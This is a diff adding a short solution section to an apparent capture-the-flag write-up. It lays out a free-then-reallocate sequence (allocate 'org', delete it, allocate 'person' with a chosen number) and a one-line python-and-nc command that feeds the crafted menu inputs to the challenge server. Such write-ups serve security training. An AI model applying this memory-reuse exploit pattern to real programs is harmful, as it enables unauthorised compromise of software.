@@ -2,6 +2,15 @@
 
 ## Solution 
 
+1. Allocate space for `org`.
+2. "delete" it.
+3. Allocate space for `person`. Personal_num = 4199030, business_num = 0.
+4. Print a namecard with the corresponding `org` and `person`.
+
+Run:
+
+`python3 -c 'print("2","0","whatever","1","3","0","1","1","anything","1234","4199030","0","4","0","1", sep="\n")' | nc challs.nusgreyhats.org 10525`
+
 ## Thought process
 
 Examine the source code first.
